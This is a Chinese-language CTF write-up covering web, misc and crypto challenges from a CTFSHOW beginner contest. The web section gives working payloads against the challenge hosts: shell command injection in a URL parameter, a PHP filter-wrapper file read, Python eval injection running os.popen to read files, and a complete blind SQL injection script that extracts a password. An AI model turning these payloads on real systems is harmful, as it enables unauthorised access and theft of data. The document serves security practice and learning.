---
title: CTFSHOW平台萌新赛WP
date: 2020-03-06
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# CTFSHOW平台萌新赛web、Crypto部分misc

## WEB

### web签到

代码很简单,命令执行

利用命令分隔符

<!-- more -->

payload

```
https://e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show/?url=1;ls;echo

https://e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show/?url=1;cat%20flag;echo
```

### web给她

扫目录.发现git泄露,githack扒下来,代码不全,但是可以看到hitn.php

```
<?php
$pass=sprintf("and pass='%s'",addslashes($_GET['pass']));
$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));
?>
```

利用sprintf和addslashes的漏洞

参考搜的一篇文章[【PHP】由一次CTF引发的学习笔记之PHP的sprintf函数](https://www.jianshu.com/p/3f14bae3396f)

打开是404页面,但是f12查看状态码是200,说明是假的404,而且有php文件显示,f12,发现html页面的注释提示,查看cookies,发现是16进制,转换是flag.txt,先考虑直接文件包含,提示no flag再考虑根据利用伪协议,先试了base64,提示no base64,换成rot13成功读取

php://filter/read=string.rot13/resource=/flag

### web假赛生

瞎蒙的

页面源代码说要登录

没有账号,先注册

先注册admin,不允许

admın admın(不懂原理,瞎蒙的)注册,

用admin admin登录,成功登录admin

根据正则匹配,c不传值就可以过

### web数据及格了

robots.txt,发现使用debug

计算机,按个1+1,发现数据包,在最后随便加个符号

```
http://124.156.121.112:5000/_calculate?number1=1&operator=%2B&number2=1{
```

出现报错页面,报错最后发现eval和判断

[![mark](https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim)](https://blogjpg.yanmy.top/blog/20200306/2bUfP3hLKXdd.png?imageslim)

核心代码,刚开始想利用利用eval反弹shell,但是失败了

利用eval,导入os库,执行代码

```
http://124.156.121.112:5000/_calculate?number1=1&operator=%2B&number2=1%2Bint(__import__(%27os%27).popen(%22ls%22).read())
```

列目录后发现flag.sh,再读flag.sh

```
[http://124.156.121.112:5000/_calculate?number1=1&operator=%2B&number2=1%2Bint(__import__(%27os%27).popen(%22cat%20flag.sh%22).read())](http://124.156.121.112:5000/_calculate?number1=1&operator=%2B&number2=1%2Bint(__import__('os').popen("cat flag.sh").read()))
```

读取到真正的flag位置

```
http://124.156.121.112:5000/_calculate?number1=0&operator=%2B&number2=0%2Bint(__import__('os').popen("cat%20/home/ctf/web/flag").read())
```

### web_萌新记忆

dirmap扫目录,扫出后台登录

登录admin admin,提示密码错误,改变用户名提示用户名/密码错误

推断是先判断用户名,在判断密码,尝试弱口令密码爆破,github找了两个字典10000条数据bp没跑出来,尝试sql注入,过滤了很多字符,大致判断了一下

```
合法
| ' , length left < substr 空格
过滤
" . or & and ; # + - union select from mid ascii order table > =
```

注释符都过滤掉了,但是单给一个引号会报错,所以应该有注入方法

搜搜找找,找到参考资料[CTF利用 Burpsuite Fuzz 实现 SQL 注入](https://segmentfault.com/a/1190000018748071)

推测应该差不多,看懂之后,测试

payload

```
u='||xxx||'&p=123
#第一个随便写的,尝试一下发现报错,unknown column
#于是再试
u='||u||'&p=123
u='||length(u)<5||'&p=123
u='||length(u)<6||'&p=123
u='||length(pwd)||'&p=123
u='||length(password)||'&p=123
u='||length(p)||'&p=123
u='||length(p)<17||'&p=123
u='||length(p)<18||'&p=123
```

上面这些可以得到一些信息,表中字段是u,p,账号是admin,密码是17位

然后就是利用相同原理进行盲注了脚本

```
import requests
s=requests.session()
url="https://30f04198-23e0-4a0e-a14d-e29e8a13aea6.chall.ctf.show/admin/checklogin.php"

def get_length():
    for i in range(1,127):
        postdata = {
            'u':"'||length(p)<"+str(i)+"||'",
            'p':'123'
        }
        print(i,postdata)
        r = s.post(url,data=postdata)
        if '用户名'not in r.text:
            print("get length! length="+str(i-1))
            return i
def get_pwd_char():
    pwd = ''
    strs = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for i in range(0,length):
        for c in strs:
            postdata = {
                'u':"'||substr(p,"+str(i+1)+",1)<'"+str(c),
                'p':'123'
            }
            # print(i,postdata)
            r = s.post(url=url,data=postdata)
            # print(r.text)
            if '用户名' not in r.text and '密码' in r.text:
                pwd += chr(ord(c)-1)
                # print(pwd)
                break
            print(chr(ord(c) - 1),end='')
        print("||"+str(i+1),pwd)


if __name__ == '__main__':
    length=0
    length=get_length() #length is 17
    get_pwd_char()
```

得到密码,登录得flag

### 杂项签到

页面另存为,winhex打开,最下面诡异的20 09,20变0,09变1,转换成二进制,二进制转ASCII发现是morse,morse解码,base16解密

得flag

```
flag{MengMengDa}
```

### 杂项萌新福利

下下来,bin文件,不知道是什么东西,百度一个文件格式分析,是ABR,用ps打开,不兼容,群主提示取反,用010editor对十六进制按位取反,保存,再分析一下,可能是MP3,MP4用potplay打开,听出flag

### 杂项qrcode

转换二维码脚本

```
from PIL import Image
MAX = 25
img = Image.new("RGB",(MAX,MAX))
str="1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111"
i = 0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            img.putpixel([x,y],(0, 0, 0))
        else:
            img.putpixel([x,y],(255,255,255))
        i = i+1
img.show()
img.save("flag.png")
```

### 杂项,千字文

用Stegsolve打开,换换通道看看,多点几下,发现一个很多细小二维码的图片,另存为,

首先用切割软件切了,结果识别不出来,再用python切割,脚本网上都有,找一个改一改

```
from PIL import Image
filename = r'2.bmp'
img = Image.open(filename)
for i in range(29):
    for j in range(29):
        region = img.crop(25 * j, 25 * i, 25 * (j + 1), 25 * (i + 1))
        region.save('out/{}{}.png'.format(j, i))
```

再用群里大佬分享的微微批量识别,在csv文件查找flag

## Crypto

### 密码学签到

base85得flag

### 抱我

分析逻辑,每11位位一组,第一位是没用的字符,去掉第一位,剩下的就是flag中的字符,先遍历出flag中的字符

```
import random

cstring = 'abcdefghijklmnopqrstuvwxyz{}_0123456789'
key = 'flag{********}'
length = 300

def encode():
    res = ''
    for i in range(1, length):
        c = random.randint(0, 36)
        # print(c)
        res += cstring[c]
        # print(res)
        for n in range(10):
            c = random.randint(0, len(key) - 1)
            res += key[c]
            # print(res)
    return res
# encode()



str = "qdfl33{6{6gs3afa6{3}agf{}aagdf}6fl36d{dfl{6ay6gafddfg}{j3f}}6la{3}bfdf3}gla}65}lg6g6dflf0{dfgd3fdfgc{g6a}a3{6}mfa{}f}f}}}3363}}f6a6a7g{a}g66{d3xgfffg}a}3}_{lad}a33ga5fd33}{{dl}{}f{3da}g}3egfal{a3l}3f33}dfdda{3sa{d6g{ff}6vgl33d6g333h{gd{{lg6ldg{ad{3333a6oalf6a{33{de3{fa}ggl{abfd}6}6}}l33fa}f{{3{3fla}a6}af}{amg}{{d}}a6gallfg36{g3dh{{{a{lfg3{sll6g6gfaggid6d{3afl}3rff3gfad3d}1dlllff6}6}h3g66gla336b{6d3gf}f{30d63l}3dfl6a3llfgld3{}qg}gf}dg{6l}3gal}agdl6{lg{g}ddfaaealf{f3llgge3ad3{3adf{c}fllf6f}3at{aag}a66d3}ad{dfg{}dlz6gld}6{3flxgf{3g3ald}3g}g63f6ggf3}gfd}f3ga3efllf6}363fu6366fdlggfx6}6l3}}a{afg{{}}3fdaluaa}al{dg3dpfga}}l}d3l4afg}f{d{lgcfgffglal}dq6l}fgflldavdad6}df{}dw}l6g}}{l3gf6fdaa66aadt}f6lg{dg33h{fa3d{}laao3l6aal{lfdv{3dlf6af36bddg}3ggad3o}{}3g3fgddyffd3lddgdd6{gdfl{{la3ild}dg{g}dgef{a3{d6dfgq3adll{fdadt}66fdflg{3x{l3ll}3{{g4a3af6lag3gdaf66dadg6dfglaf66l3f{2}6{afaf}3l6all}{l}lfdla6{fgff{}g13dl{a{6{l6rd6}}l3dgg3_f{66gll{f6a3d3dga6{lg}{g}d{6{d36lll3dd6{3dg3afal}d}gff26}l}al}}{a6}g66gaaff}0fga{g6dfld{{}fglf{af}iddf6g6}l361{ag}{{dlfak}{d3fa{6{godgg{l36a{gmllgfa3fa{}f}}3{a6{a3{nafg{l3d6}g2lf6{gg}{g}sg{ga{63g{}la6g{g6{{63o6{l}{3}l3ag36{af33g3dw6d33f3lfdan{dddad{{6l6}}fad63lgd1ffaa}g}3flkg3d}aalf3lbgf{g}f}}d3agf{ld{dl3l4fl{{3fla}}r3g}{}gda{}_df3g}fa36gq}la{f{6l}66fgdg}6ag6feaal6all3{d}lfgl}}{{6lal}gf}}gfgd4d{g36daff}l6fd63ag6}f7}l3{{d}{al6lff66gda}f7dfaf6}fd3ldfgfl36gf337a6al663afd{dff}6}df{lt}66}ag6a3{na}3la{6daa}63fgldf3ggcl6dd{3fg{}}gfgaf{633lpfadalldgglg{l}{6}gf{agf6{3l3a366wa6l6}fdla}wfl}33}d{6d6aa}laldag}bgaa3gff}3db{gd}lfga3{}ffddd6}{la4}3{agdg3{}bf33adg3a632d}66f}dgd67}{333dfg}}mgg3all3l}fd6dd3{g}{}}v6}a6f6lgd3nfgg6aff3a}d3da{l3ldldz{}{}g3}6fdg6f{gd{g3adx{gll6{fg3dc63lf}6dl{d63f3g{3adda5f3dgfla3{6}gd{3{d6dlldal6g66}{ddp}lalafd}d{lgl}g6g33agjg}33dgf}lg0adlda6gfdlx{3g}{g3a{a76}gdf3la}lh}l{l{}}a6gm{gdd{agg}6xfgg}{336}d_a{df3}df33jgf}6d3}}f}h3l{6ga6fll2}dd{l36d66}ldafdlga3gbgd}d6df}ff1gf6a{ll3a3w{3g}allfafldal}aal}dlra33l3f}3dff{6{6}f}la}lgf}}}gd{f3z3l3{d3636dpl3fag3{faa1{3ga33l}6ll6{gg6}ddf}t6g}{gl6ggl{d}aafalf{lw6a{dad}}a3x{ada{fg6d}a3g{d{fggdawdfal{{3dlfndl636}36alv633ada6gf6hd{3l66ddlfpglda}{g3fdogdfa3}3g}3k3d3gda33}dvd}laa{fa{a{{}a}36}}}{r6d6{a6}}6{0laa36gd{36kf63a{3}gga4af6}f3gfgf0lf{6g}{{6}pafg6dg}g6{b}3d36ad6d{h6f3agff}63p}{l3ag3}lf1f3dgd{66a37}}}d6gglaftaf3l6a3{{a7{lgd3d}fl6tlfl663lgg3wa}33gl}d{3i6aaagl6{{}n3gd}l3l6}l7a{gf{a}l}f3al{alg63fln{{dd}3l{ll1}{3g}6{6}{u63{f3{g6lgf{3d}{636}{u3}{f6d{{d3lg{3l6aldf{i{f366{f3l{eg{d{gll{3dhgdgfgaf{}}g}{lg3{a{flm}fa3ldf{d32fagllf{{66q363}dl66gg2fa6af6d6g37lffl{d{3lltgl33}}{}d3o{lfld3d{}a6a663a66{fabfd6ld333g3rafa}}fddfgt{ggad3ag}lr63af6lgg}gy{6{{6}6dd626{gl6a{ad3b3df}alf3afdaf66ll}lf6jd}3{6dldfgg}f3lg63l{lr3ff3l{gafaa}f}agl6l33xglfggg{{{fq66}g6lfa3{736lllflalglf}{}gf{aggdg3{a}}da{fp6fglla3l}65gf36{l6dl}g}f{la6{l{fpf{}63{f6gdfaalf6{dffgdgf{lgaf{f{56}g6af63l6a}a}{lfa{3gblda}l}{fl{s{g}}6{g6la56g6g3{f}ddfaa{l}dg6g}0glda6{6d}ff}f{6laadd6zaag{l3l}6dc}f3gg}lffgsag}l3l6d3apd3gd3fd}}aga3ga}a3{6f1f3df{{d}}av3laf}6adf3_d{afa6f}adt{faf{d33aaol3}{l}ld}3yl3a6a{fa6}_d33gf3fll}of{6lad}}fdx}6d{f}ll63ugag66d{6f3}33}al6l{ffwf{}{fl3a36ogg3{}}g6}3hl}6dg6ld{digaa}g}{{l}da{ddg3{{d}w3}ld}adgg3m{lad{gd{a{7afff}{d6}fsf3{f}gflgavfldg6a6{ldqf}fd{f3f3}73ddad{666fz6}d{3{l36a1d6fal3fl6lrl{}aga{fdlsa}{6l6ag3gtgdg{6lgf3f"
lengths = len(str)
flag = ""
for i in range(0, lengths):
    if i % 11 != 0:
        if str[i] not in flag:
            flag += str[i]
print(flag)
```

再把结果中的几个字符拼成一句话

### 妈呀_完了

群主提示就差把答案说出来了.二进制转ascii得到密文,AES加解密,密匙是20121221得flag